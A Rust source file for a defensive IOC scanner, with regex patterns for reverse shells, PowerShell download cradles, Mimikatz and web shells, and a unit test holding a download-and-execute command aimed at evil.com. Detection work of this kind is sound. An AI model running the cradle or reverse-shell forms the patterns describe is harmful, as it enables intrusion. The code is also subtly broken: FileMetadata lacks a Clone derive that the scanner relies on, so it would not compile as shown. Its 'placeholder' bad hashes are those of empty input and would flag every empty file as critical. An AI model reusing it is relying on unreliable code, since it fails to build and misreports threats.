//! # BT01 - Indicators of Compromise (IOC) Scanner
//!
//! A comprehensive IOC scanning tool for Blue Team defensive operations.
//!
//! ## Blue Team Concepts
//!
//! **Indicators of Compromise (IOCs)** are pieces of forensic data that identify
//! potentially malicious activity on a system or network. Common IOC types include:
//!
//! - **File Hashes**: MD5, SHA1, SHA256 hashes of known malicious files
//! - **File Names**: Known malicious file names or patterns
//! - **IP Addresses**: Command & Control (C2) server addresses
//! - **Domain Names**: Malicious domains used in attacks
//! - **Registry Keys**: Windows registry modifications (on Windows systems)
//! - **Mutex Names**: Synchronization objects created by malware
//! - **YARA Rules**: Pattern matching rules for malware detection
//!
//! ## Detection Strategies
//!
//! 1. **Hash-based Detection**: Compare file hashes against known-bad databases
//! 2. **Pattern Matching**: Use regex to find suspicious strings in files
//! 3. **Behavioral Indicators**: Look for files in unusual locations
//! 4. **Temporal Analysis**: Identify recently modified suspicious files
//!
//! ## Usage Examples
//!
//! ```bash
//! # Scan directory with default IOC database
//! ioc-scanner --target /suspicious/directory
//!
//! # Scan with custom IOC database
//! ioc-scanner --target /home --ioc-db custom_iocs.json
//!
//! # Generate report in JSON format
//! ioc-scanner --target / --output report.json --format json
//! ```

use anyhow::{Context, Result};
use chrono::{DateTime, Utc};
use clap::{Parser, ValueEnum};
use colored::*;
use md5::Md5;
use regex::Regex;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::{HashMap, HashSet};
use std::fs::{self, File};
use std::io::{BufRead, BufReader, Read, Write};
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

// ============================================================================
// CLI ARGUMENT DEFINITIONS
// ============================================================================

/// IOC Scanner - Scan systems for Indicators of Compromise
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Target directory or file to scan
    #[arg(short, long)]
    target: PathBuf,

    /// Path to IOC database JSON file
    #[arg(short, long)]
    ioc_db: Option<PathBuf>,

    /// Output file for scan results
    #[arg(short, long)]
    output: Option<PathBuf>,

    /// Output format
    #[arg(short, long, value_enum, default_value = "text")]
    format: OutputFormat,

    /// Maximum file size to scan (in MB)
    #[arg(long, default_value = "100")]
    max_size_mb: u64,

    /// Follow symbolic links during scan
    #[arg(long, default_value = "false")]
    follow_symlinks: bool,

    /// Verbose output
    #[arg(short, long)]
    verbose: bool,

    /// Quick scan mode (hash-only, skip pattern matching)
    #[arg(long)]
    quick: bool,
}

#[derive(Debug, Clone, ValueEnum)]
enum OutputFormat {
    Text,
    Json,
    Csv,
}

// ============================================================================
// IOC DATA STRUCTURES
// ============================================================================

/// Represents the IOC database containing all known indicators
///
/// ## Database Structure
///
/// The IOC database is structured to support multiple indicator types:
/// - Hash-based indicators for quick file identification
/// - Pattern-based indicators for content scanning
/// - Path-based indicators for suspicious locations
#[derive(Debug, Serialize, Deserialize)]
struct IocDatabase {
    /// Version of the IOC database
    version: String,
    /// Last update timestamp
    last_updated: DateTime<Utc>,
    /// SHA256 hashes of known malicious files
    sha256_hashes: HashSet<String>,
    /// MD5 hashes (legacy, still used by some threat intel feeds)
    md5_hashes: HashSet<String>,
    /// Suspicious file name patterns (regex)
    filename_patterns: Vec<String>,
    /// Suspicious content patterns (regex)
    content_patterns: Vec<ContentPattern>,
    /// Suspicious file paths
    suspicious_paths: Vec<String>,
    /// Known malicious IP addresses
    malicious_ips: HashSet<String>,
    /// Known malicious domains
    malicious_domains: HashSet<String>,
}

/// Content pattern with metadata for better detection context
#[derive(Debug, Serialize, Deserialize, Clone)]
struct ContentPattern {
    /// Pattern name/identifier
    name: String,
    /// Regex pattern to match
    pattern: String,
    /// Severity level (1-10)
    severity: u8,
    /// Description of what this pattern indicates
    description: String,
    /// MITRE ATT&CK technique ID if applicable
    mitre_id: Option<String>,
}

/// Represents a single IOC match/detection
#[derive(Debug, Serialize, Deserialize)]
struct IocMatch {
    /// File path where IOC was found
    file_path: PathBuf,
    /// Type of IOC detected
    ioc_type: IocType,
    /// The specific indicator that matched
    indicator: String,
    /// Severity level (1-10)
    severity: u8,
    /// Description of the match
    description: String,
    /// Timestamp when detected
    detected_at: DateTime<Utc>,
    /// File metadata
    file_metadata: FileMetadata,
}

#[derive(Debug, Serialize, Deserialize)]
enum IocType {
    Sha256Hash,
    Md5Hash,
    FilenamePattern,
    ContentPattern,
    SuspiciousPath,
    MaliciousIp,
    MaliciousDomain,
}

#[derive(Debug, Serialize, Deserialize)]
struct FileMetadata {
    size_bytes: u64,
    modified: Option<DateTime<Utc>>,
    created: Option<DateTime<Utc>>,
    is_executable: bool,
    is_hidden: bool,
}

/// Complete scan report
#[derive(Debug, Serialize, Deserialize)]
struct ScanReport {
    /// Scan start time
    scan_started: DateTime<Utc>,
    /// Scan end time
    scan_completed: DateTime<Utc>,
    /// Target that was scanned
    target: PathBuf,
    /// Total files scanned
    files_scanned: u64,
    /// Total bytes scanned
    bytes_scanned: u64,
    /// Files skipped (too large, inaccessible, etc.)
    files_skipped: u64,
    /// All IOC matches found
    matches: Vec<IocMatch>,
    /// Summary statistics
    summary: ScanSummary,
}

#[derive(Debug, Serialize, Deserialize)]
struct ScanSummary {
    total_matches: usize,
    critical_matches: usize,  // severity >= 8
    high_matches: usize,      // severity 6-7
    medium_matches: usize,    // severity 4-5
    low_matches: usize,       // severity 1-3
    unique_ioc_types: HashMap<String, usize>,
}

// ============================================================================
// IOC DATABASE MANAGEMENT
// ============================================================================

impl IocDatabase {
    /// Create a default IOC database with common indicators
    ///
    /// ## Default Indicators
    ///
    /// This provides a baseline set of IOCs commonly associated with malware:
    /// - Common malware file patterns (mimikatz, cobalt strike, etc.)
    /// - Suspicious PowerShell patterns
    /// - Web shell indicators
    /// - Known C2 patterns
    fn default_database() -> Self {
        let mut sha256_hashes = HashSet::new();
        let mut md5_hashes = HashSet::new();

        // Example known-bad hashes (these are placeholders for demonstration)
        // In production, these would come from threat intelligence feeds
        sha256_hashes.insert("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855".to_string());
        md5_hashes.insert("d41d8cd98f00b204e9800998ecf8427e".to_string());

        let filename_patterns = vec![
            // Common malware names
            r"(?i)mimikatz".to_string(),
            r"(?i)cobaltstrike".to_string(),
            r"(?i)beacon\.dll".to_string(),
            r"(?i)psexec".to_string(),
            // Suspicious extensions
            r"(?i)\.ps1\.txt$".to_string(),
            r"(?i)\.exe\.tmp$".to_string(),
            // Web shells
            r"(?i)(cmd|shell|webshell|c99|r57)\.php".to_string(),
            r"(?i)(cmd|shell|webshell)\.aspx?".to_string(),
            // Encoded/obfuscated files
            r"(?i)base64_decode.*eval".to_string(),
        ];

        let content_patterns = vec![
            ContentPattern {
                name: "PowerShell Download Cradle".to_string(),
                pattern: r"(?i)(IEX|Invoke-Expression).*\(.*Net\.WebClient".to_string(),
                severity: 8,
                description: "PowerShell code downloading and executing remote content".to_string(),
                mitre_id: Some("T1059.001".to_string()),
            },
            ContentPattern {
                name: "Base64 Encoded PowerShell".to_string(),
                pattern: r"(?i)powershell.*-e(nc(odedcommand)?)?.*[A-Za-z0-9+/=]{50,}".to_string(),
                severity: 7,
                description: "Encoded PowerShell command execution".to_string(),
                mitre_id: Some("T1027".to_string()),
            },
            ContentPattern {
                name: "Mimikatz Keywords".to_string(),
                pattern: r"(?i)(sekurlsa|kerberos::list|lsadump|privilege::debug)".to_string(),
                severity: 9,
                description: "Mimikatz credential theft tool indicators".to_string(),
                mitre_id: Some("T1003".to_string()),
            },
            ContentPattern {
                name: "Reverse Shell".to_string(),
                pattern: r"(?i)(bash\s+-i\s+>&|/dev/tcp/|nc\s+-e|python.*socket.*connect)".to_string(),
                severity: 9,
                description: "Reverse shell indicators".to_string(),
                mitre_id: Some("T1059".to_string()),
            },
            ContentPattern {
                name: "Web Shell Eval".to_string(),
                pattern: r#"(?i)(eval\s*\(\s*\$_(GET|POST|REQUEST)|shell_exec|system\s*\()"#.to_string(),
                severity: 8,
                description: "PHP web shell indicators".to_string(),
                mitre_id: Some("T1505.003".to_string()),
            },
            ContentPattern {
                name: "Windows API Injection".to_string(),
                pattern: r"(?i)(VirtualAlloc|WriteProcessMemory|CreateRemoteThread|NtCreateThreadEx)".to_string(),
                severity: 6,
                description: "Windows API calls commonly used in process injection".to_string(),
                mitre_id: Some("T1055".to_string()),
            },
            ContentPattern {
                name: "Credential Access Strings".to_string(),
                pattern: r"(?i)(password\s*=|passwd\s*=|credential|SAM\s*database)".to_string(),
                severity: 4,
                description: "Potential credential access indicators".to_string(),
                mitre_id: Some("T1552".to_string()),
            },
        ];

        let suspicious_paths = vec![
            "/tmp/.".to_string(),
            "/dev/shm/".to_string(),
            "/var/tmp/".to_string(),
            "C:\\Windows\\Temp\\".to_string(),
            "C:\\Users\\Public\\".to_string(),
        ];

        let mut malicious_ips = HashSet::new();
        let mut malicious_domains = HashSet::new();

        // Example C2 IPs (placeholders)
        malicious_ips.insert("192.168.1.100".to_string());
        malicious_domains.insert("malware.evil.com".to_string());

        IocDatabase {
            version: "1.0.0".to_string(),
            last_updated: Utc::now(),
            sha256_hashes,
            md5_hashes,
            filename_patterns,
            content_patterns,
            suspicious_paths,
            malicious_ips,
            malicious_domains,
        }
    }

    /// Load IOC database from a JSON file
    fn load_from_file(path: &Path) -> Result<Self> {
        let file = File::open(path)
            .with_context(|| format!("Failed to open IOC database: {:?}", path))?;
        let reader = BufReader::new(file);
        let db: IocDatabase = serde_json::from_reader(reader)
            .with_context(|| "Failed to parse IOC database JSON")?;
        Ok(db)
    }

    /// Save IOC database to a JSON file
    fn save_to_file(&self, path: &Path) -> Result<()> {
        let file = File::create(path)
            .with_context(|| format!("Failed to create IOC database file: {:?}", path))?;
        serde_json::to_writer_pretty(file, self)
            .with_context(|| "Failed to write IOC database")?;
        Ok(())
    }
}

// ============================================================================
// IOC SCANNER IMPLEMENTATION
// ============================================================================

/// Main IOC Scanner structure
struct IocScanner {
    /// IOC database to scan against
    database: IocDatabase,
    /// Compiled regex patterns for filename matching
    filename_regexes: Vec<Regex>,
    /// Compiled regex patterns for content matching
    content_regexes: Vec<(ContentPattern, Regex)>,
    /// Maximum file size in bytes
    max_file_size: u64,
    /// Enable verbose output
    verbose: bool,
    /// Quick scan mode
    quick_mode: bool,
}

impl IocScanner {
    /// Create a new IOC scanner with the given database
    fn new(database: IocDatabase, max_size_mb: u64, verbose: bool, quick: bool) -> Result<Self> {
        // Compile filename patterns
        let mut filename_regexes = Vec::new();
        for pattern in &database.filename_patterns {
            match Regex::new(pattern) {
                Ok(regex) => filename_regexes.push(regex),
                Err(e) => {
                    if verbose {
                        eprintln!("Warning: Invalid filename pattern '{}': {}", pattern, e);
                    }
                }
            }
        }

        // Compile content patterns
        let mut content_regexes = Vec::new();
        for pattern in &database.content_patterns {
            match Regex::new(&pattern.pattern) {
                Ok(regex) => content_regexes.push((pattern.clone(), regex)),
                Err(e) => {
                    if verbose {
                        eprintln!("Warning: Invalid content pattern '{}': {}", pattern.name, e);
                    }
                }
            }
        }

        Ok(IocScanner {
            database,
            filename_regexes,
            content_regexes,
            max_file_size: max_size_mb * 1024 * 1024,
            verbose,
            quick_mode: quick,
        })
    }

    /// Scan a target path for IOCs
    fn scan(&self, target: &Path, follow_symlinks: bool) -> Result<ScanReport> {
        let scan_started = Utc::now();
        let mut matches = Vec::new();
        let mut files_scanned = 0u64;
        let mut bytes_scanned = 0u64;
        let mut files_skipped = 0u64;

        println!("{}", "=".repeat(60).blue());
        println!("{}", "IOC Scanner - Indicators of Compromise Detection".blue().bold());
        println!("{}", "=".repeat(60).blue());
        println!("Target: {}", target.display().to_string().yellow());
        println!("Scan Started: {}", scan_started.format("%Y-%m-%d %H:%M:%S UTC"));
        println!("{}", "-".repeat(60).blue());

        // Walk through all files in the target
        let walker = WalkDir::new(target)
            .follow_links(follow_symlinks)
            .into_iter()
            .filter_map(|e| e.ok());

        for entry in walker {
            let path = entry.path();

            // Skip directories
            if path.is_dir() {
                continue;
            }

            // Get file metadata
            let metadata = match fs::metadata(path) {
                Ok(m) => m,
                Err(e) => {
                    if self.verbose {
                        eprintln!("Skipping {:?}: {}", path, e);
                    }
                    files_skipped += 1;
                    continue;
                }
            };

            let file_size = metadata.len();

            // Skip files that are too large
            if file_size > self.max_file_size {
                if self.verbose {
                    println!("Skipping large file: {:?} ({} MB)", path, file_size / 1024 / 1024);
                }
                files_skipped += 1;
                continue;
            }

            // Scan the file
            match self.scan_file(path, &metadata) {
                Ok(file_matches) => {
                    for m in file_matches {
                        self.print_match(&m);
                        matches.push(m);
                    }
                    files_scanned += 1;
                    bytes_scanned += file_size;
                }
                Err(e) => {
                    if self.verbose {
                        eprintln!("Error scanning {:?}: {}", path, e);
                    }
                    files_skipped += 1;
                }
            }

            // Progress indicator
            if files_scanned % 1000 == 0 && self.verbose {
                println!("Progress: {} files scanned...", files_scanned);
            }
        }

        let scan_completed = Utc::now();

        // Generate summary
        let summary = self.generate_summary(&matches);

        println!("{}", "-".repeat(60).blue());
        println!("{}", "Scan Complete".green().bold());
        println!("Duration: {:.2}s", (scan_completed - scan_started).num_milliseconds() as f64 / 1000.0);
        println!("Files Scanned: {}", files_scanned);
        println!("Files Skipped: {}", files_skipped);
        println!("Total Matches: {}", matches.len());
        println!("{}", "=".repeat(60).blue());

        Ok(ScanReport {
            scan_started,
            scan_completed,
            target: target.to_path_buf(),
            files_scanned,
            bytes_scanned,
            files_skipped,
            matches,
            summary,
        })
    }

    /// Scan a single file for IOCs
    fn scan_file(&self, path: &Path, metadata: &std::fs::Metadata) -> Result<Vec<IocMatch>> {
        let mut matches = Vec::new();
        let file_metadata = self.extract_metadata(path, metadata);
        let filename = path.file_name().unwrap_or_default().to_string_lossy();

        // Check filename patterns
        for regex in &self.filename_regexes {
            if regex.is_match(&filename) {
                matches.push(IocMatch {
                    file_path: path.to_path_buf(),
                    ioc_type: IocType::FilenamePattern,
                    indicator: regex.as_str().to_string(),
                    severity: 6,
                    description: format!("Filename matches suspicious pattern: {}", regex.as_str()),
                    detected_at: Utc::now(),
                    file_metadata: file_metadata.clone(),
                });
            }
        }

        // Check suspicious paths
        let path_str = path.to_string_lossy().to_string();
        for suspicious in &self.database.suspicious_paths {
            if path_str.contains(suspicious) {
                matches.push(IocMatch {
                    file_path: path.to_path_buf(),
                    ioc_type: IocType::SuspiciousPath,
                    indicator: suspicious.clone(),
                    severity: 5,
                    description: format!("File located in suspicious path: {}", suspicious),
                    detected_at: Utc::now(),
                    file_metadata: file_metadata.clone(),
                });
            }
        }

        // Read file for hash and content checks
        let mut file = match File::open(path) {
            Ok(f) => f,
            Err(_) => return Ok(matches),
        };

        let mut buffer = Vec::new();
        if file.read_to_end(&mut buffer).is_err() {
            return Ok(matches);
        }

        // Calculate file hashes
        let sha256_hash = format!("{:x}", Sha256::digest(&buffer));
        let md5_hash = format!("{:x}", Md5::digest(&buffer));

        // Check SHA256 hash
        if self.database.sha256_hashes.contains(&sha256_hash) {
            matches.push(IocMatch {
                file_path: path.to_path_buf(),
                ioc_type: IocType::Sha256Hash,
                indicator: sha256_hash.clone(),
                severity: 10,
                description: "File hash matches known malicious SHA256".to_string(),
                detected_at: Utc::now(),
                file_metadata: file_metadata.clone(),
            });
        }

        // Check MD5 hash
        if self.database.md5_hashes.contains(&md5_hash) {
            matches.push(IocMatch {
                file_path: path.to_path_buf(),
                ioc_type: IocType::Md5Hash,
                indicator: md5_hash.clone(),
                severity: 10,
                description: "File hash matches known malicious MD5".to_string(),
                detected_at: Utc::now(),
                file_metadata: file_metadata.clone(),
            });
        }

        // Content pattern matching (skip in quick mode)
        if !self.quick_mode {
            if let Ok(content) = String::from_utf8(buffer.clone()) {
                // Check content patterns
                for (pattern, regex) in &self.content_regexes {
                    if regex.is_match(&content) {
                        matches.push(IocMatch {
                            file_path: path.to_path_buf(),
                            ioc_type: IocType::ContentPattern,
                            indicator: pattern.name.clone(),
                            severity: pattern.severity,
                            description: pattern.description.clone(),
                            detected_at: Utc::now(),
                            file_metadata: file_metadata.clone(),
                        });
                    }
                }

                // Check for IP addresses and domains in content
                self.check_network_indicators(&content, path, &file_metadata, &mut matches);
            }
        }

        Ok(matches)
    }

    /// Check content for malicious IPs and domains
    fn check_network_indicators(
        &self,
        content: &str,
        path: &Path,
        metadata: &FileMetadata,
        matches: &mut Vec<IocMatch>,
    ) {
        // Check for malicious IPs
        let ip_regex = Regex::new(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b").unwrap();
        for cap in ip_regex.captures_iter(content) {
            if let Some(ip) = cap.get(1) {
                if self.database.malicious_ips.contains(ip.as_str()) {
                    matches.push(IocMatch {
                        file_path: path.to_path_buf(),
                        ioc_type: IocType::MaliciousIp,
                        indicator: ip.as_str().to_string(),
                        severity: 8,
                        description: format!("Known malicious IP address found: {}", ip.as_str()),
                        detected_at: Utc::now(),
                        file_metadata: metadata.clone(),
                    });
                }
            }
        }

        // Check for malicious domains
        for domain in &self.database.malicious_domains {
            if content.contains(domain) {
                matches.push(IocMatch {
                    file_path: path.to_path_buf(),
                    ioc_type: IocType::MaliciousDomain,
                    indicator: domain.clone(),
                    severity: 8,
                    description: format!("Known malicious domain found: {}", domain),
                    detected_at: Utc::now(),
                    file_metadata: metadata.clone(),
                });
            }
        }
    }

    /// Extract file metadata
    fn extract_metadata(&self, path: &Path, metadata: &std::fs::Metadata) -> FileMetadata {
        let modified = metadata.modified().ok().map(|t| DateTime::from(t));
        let created = metadata.created().ok().map(|t| DateTime::from(t));

        // Check if file is executable (Unix)
        #[cfg(unix)]
        let is_executable = {
            use std::os::unix::fs::PermissionsExt;
            metadata.permissions().mode() & 0o111 != 0
        };
        #[cfg(not(unix))]
        let is_executable = path.extension().map_or(false, |e| e == "exe" || e == "bat" || e == "cmd");

        let is_hidden = path.file_name()
            .map(|n| n.to_string_lossy().starts_with('.'))
            .unwrap_or(false);

        FileMetadata {
            size_bytes: metadata.len(),
            modified,
            created,
            is_executable,
            is_hidden,
        }
    }

    /// Print a match to the console with color coding
    fn print_match(&self, m: &IocMatch) {
        let severity_color = match m.severity {
            9..=10 => "CRITICAL".red().bold(),
            7..=8 => "HIGH".red(),
            5..=6 => "MEDIUM".yellow(),
            _ => "LOW".white(),
        };

        println!("\n{} [{}] {}",
            "[!]".red().bold(),
            severity_color,
            m.description.white()
        );
        println!("    Path: {}", m.file_path.display().to_string().cyan());
        println!("    Indicator: {}", m.indicator.yellow());
        println!("    Type: {:?}", m.ioc_type);
    }

    /// Generate summary statistics
    fn generate_summary(&self, matches: &[IocMatch]) -> ScanSummary {
        let mut type_counts: HashMap<String, usize> = HashMap::new();
        let mut critical = 0;
        let mut high = 0;
        let mut medium = 0;
        let mut low = 0;

        for m in matches {
            let type_name = format!("{:?}", m.ioc_type);
            *type_counts.entry(type_name).or_insert(0) += 1;

            match m.severity {
                9..=10 => critical += 1,
                7..=8 => high += 1,
                5..=6 => medium += 1,
                _ => low += 1,
            }
        }

        ScanSummary {
            total_matches: matches.len(),
            critical_matches: critical,
            high_matches: high,
            medium_matches: medium,
            low_matches: low,
            unique_ioc_types: type_counts,
        }
    }
}

// ============================================================================
// REPORT GENERATION
// ============================================================================

/// Generate output report in specified format
fn generate_report(report: &ScanReport, format: &OutputFormat, output: Option<&PathBuf>) -> Result<()> {
    let content = match format {
        OutputFormat::Json => serde_json::to_string_pretty(report)?,
        OutputFormat::Csv => generate_csv_report(report),
        OutputFormat::Text => generate_text_report(report),
    };

    if let Some(path) = output {
        let mut file = File::create(path)?;
        file.write_all(content.as_bytes())?;
        println!("Report saved to: {}", path.display());
    } else if matches!(format, OutputFormat::Csv) {
        println!("{}", content);
    }

    Ok(())
}

fn generate_csv_report(report: &ScanReport) -> String {
    let mut csv = String::from("File Path,IOC Type,Indicator,Severity,Description,Detected At\n");

    for m in &report.matches {
        csv.push_str(&format!(
            "\"{}\",\"{:?}\",\"{}\",{},\"{}\",\"{}\"\n",
            m.file_path.display(),
            m.ioc_type,
            m.indicator.replace('"', "\"\""),
            m.severity,
            m.description.replace('"', "\"\""),
            m.detected_at.format("%Y-%m-%d %H:%M:%S")
        ));
    }

    csv
}

fn generate_text_report(report: &ScanReport) -> String {
    let mut text = String::new();
    text.push_str(&format!("IOC Scan Report\n{}\n\n", "=".repeat(50)));
    text.push_str(&format!("Target: {}\n", report.target.display()));
    text.push_str(&format!("Scan Started: {}\n", report.scan_started));
    text.push_str(&format!("Scan Completed: {}\n", report.scan_completed));
    text.push_str(&format!("Files Scanned: {}\n", report.files_scanned));
    text.push_str(&format!("Total Matches: {}\n\n", report.summary.total_matches));

    text.push_str(&format!("Summary:\n{}\n", "-".repeat(30)));
    text.push_str(&format!("  Critical: {}\n", report.summary.critical_matches));
    text.push_str(&format!("  High: {}\n", report.summary.high_matches));
    text.push_str(&format!("  Medium: {}\n", report.summary.medium_matches));
    text.push_str(&format!("  Low: {}\n\n", report.summary.low_matches));

    text.push_str(&format!("Detailed Findings:\n{}\n", "-".repeat(30)));
    for m in &report.matches {
        text.push_str(&format!("\n[Severity {}] {}\n", m.severity, m.description));
        text.push_str(&format!("  Path: {}\n", m.file_path.display()));
        text.push_str(&format!("  Indicator: {}\n", m.indicator));
        text.push_str(&format!("  Type: {:?}\n", m.ioc_type));
    }

    text
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

fn main() -> Result<()> {
    let args = Args::parse();

    // Load or create IOC database
    let database = if let Some(db_path) = &args.ioc_db {
        println!("Loading IOC database from: {}", db_path.display());
        IocDatabase::load_from_file(db_path)?
    } else {
        println!("Using default IOC database");
        IocDatabase::default_database()
    };

    println!("IOC Database version: {}", database.version);
    println!("SHA256 hashes: {}", database.sha256_hashes.len());
    println!("MD5 hashes: {}", database.md5_hashes.len());
    println!("Filename patterns: {}", database.filename_patterns.len());
    println!("Content patterns: {}", database.content_patterns.len());

    // Create scanner
    let scanner = IocScanner::new(database, args.max_size_mb, args.verbose, args.quick)?;

    // Run scan
    let report = scanner.scan(&args.target, args.follow_symlinks)?;

    // Generate report
    generate_report(&report, &args.format, args.output.as_ref())?;

    // Print final summary
    println!("\n{}", "SCAN SUMMARY".green().bold());
    println!("{}", "=".repeat(40));
    if report.summary.critical_matches > 0 {
        println!("{}: {}", "CRITICAL".red().bold(), report.summary.critical_matches);
    }
    if report.summary.high_matches > 0 {
        println!("{}: {}", "HIGH".red(), report.summary.high_matches);
    }
    if report.summary.medium_matches > 0 {
        println!("{}: {}", "MEDIUM".yellow(), report.summary.medium_matches);
    }
    if report.summary.low_matches > 0 {
        println!("{}: {}", "LOW".white(), report.summary.low_matches);
    }

    if report.summary.total_matches > 0 {
        println!("\n{}", "ACTION REQUIRED: Review detected IOCs and take appropriate action!".red().bold());
    } else {
        println!("\n{}", "No IOCs detected.".green());
    }

    Ok(())
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;
    use std::io::Write;

    #[test]
    fn test_default_database_creation() {
        let db = IocDatabase::default_database();
        assert!(!db.filename_patterns.is_empty());
        assert!(!db.content_patterns.is_empty());
        assert_eq!(db.version, "1.0.0");
    }

    #[test]
    fn test_ioc_scanner_creation() {
        let db = IocDatabase::default_database();
        let scanner = IocScanner::new(db, 100, false, false);
        assert!(scanner.is_ok());
    }

    #[test]
    fn test_filename_pattern_matching() {
        let db = IocDatabase::default_database();
        let scanner = IocScanner::new(db, 100, false, false).unwrap();

        // Check that mimikatz pattern exists and would match
        let mimikatz_regex = scanner.filename_regexes.iter()
            .find(|r| r.is_match("mimikatz.exe"));
        assert!(mimikatz_regex.is_some());
    }

    #[test]
    fn test_content_pattern_matching() {
        let db = IocDatabase::default_database();
        let scanner = IocScanner::new(db, 100, false, false).unwrap();

        // Test PowerShell download cradle detection
        let test_content = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')";

        let matched = scanner.content_regexes.iter()
            .any(|(_, regex)| regex.is_match(test_content));
        assert!(matched);
    }

    #[test]
    fn test_hash_calculation() {
        let test_data = b"test content";
        let sha256 = format!("{:x}", Sha256::digest(test_data));
        let md5 = format!("{:x}", Md5::digest(test_data));

        assert_eq!(sha256.len(), 64);
        assert_eq!(md5.len(), 32);
    }

    #[test]
    fn test_scan_empty_directory() {
        let temp_dir = tempdir().unwrap();
        let db = IocDatabase::default_database();
        let scanner = IocScanner::new(db, 100, false, false).unwrap();

        let report = scanner.scan(temp_dir.path(), false).unwrap();
        assert_eq!(report.matches.len(), 0);
        assert_eq!(report.files_scanned, 0);
    }

    #[test]
    fn test_scan_with_suspicious_file() {
        let temp_dir = tempdir().unwrap();
        let file_path = temp_dir.path().join("mimikatz_test.exe");

        let mut file = File::create(&file_path).unwrap();
        file.write_all(b"test content").unwrap();

        let db = IocDatabase::default_database();
        let scanner = IocScanner::new(db, 100, false, false).unwrap();

        let report = scanner.scan(temp_dir.path(), false).unwrap();
        assert!(report.matches.len() > 0);
    }

    #[test]
    fn test_file_metadata_extraction() {
        let temp_dir = tempdir().unwrap();
        let file_path = temp_dir.path().join(".hidden_file");

        let mut file = File::create(&file_path).unwrap();
        file.write_all(b"hidden content").unwrap();

        let metadata = fs::metadata(&file_path).unwrap();
        let db = IocDatabase::default_database();
        let scanner = IocScanner::new(db, 100, false, false).unwrap();

        let file_meta = scanner.extract_metadata(&file_path, &metadata);
        assert!(file_meta.is_hidden);
    }

    #[test]
    fn test_summary_generation() {
        let matches = vec![
            IocMatch {
                file_path: PathBuf::from("/test"),
                ioc_type: IocType::Sha256Hash,
                indicator: "test".to_string(),
                severity: 10,
                description: "Critical match".to_string(),
                detected_at: Utc::now(),
                file_metadata: FileMetadata {
                    size_bytes: 100,
                    modified: None,
                    created: None,
                    is_executable: false,
                    is_hidden: false,
                },
            },
            IocMatch {
                file_path: PathBuf::from("/test2"),
                ioc_type: IocType::ContentPattern,
                indicator: "test2".to_string(),
                severity: 5,
                description: "Medium match".to_string(),
                detected_at: Utc::now(),
                file_metadata: FileMetadata {
                    size_bytes: 100,
                    modified: None,
                    created: None,
                    is_executable: false,
                    is_hidden: false,
                },
            },
        ];

        let db = IocDatabase::default_database();
        let scanner = IocScanner::new(db, 100, false, false).unwrap();
        let summary = scanner.generate_summary(&matches);

        assert_eq!(summary.total_matches, 2);
        assert_eq!(summary.critical_matches, 1);
        assert_eq!(summary.medium_matches, 1);
    }

    #[test]
    fn test_csv_report_generation() {
        let report = ScanReport {
            scan_started: Utc::now(),
            scan_completed: Utc::now(),
            target: PathBuf::from("/test"),
            files_scanned: 10,
            bytes_scanned: 1000,
            files_skipped: 0,
            matches: vec![],
            summary: ScanSummary {
                total_matches: 0,
                critical_matches: 0,
                high_matches: 0,
                medium_matches: 0,
                low_matches: 0,
                unique_ioc_types: HashMap::new(),
            },
        };

        let csv = generate_csv_report(&report);
        assert!(csv.starts_with("File Path,"));
    }

    #[test]
    fn test_database_serialization() {
        let db = IocDatabase::default_database();
        let json = serde_json::to_string(&db);
        assert!(json.is_ok());

        let deserialized: Result<IocDatabase, _> = serde_json::from_str(&json.unwrap());
        assert!(deserialized.is_ok());
    }
}
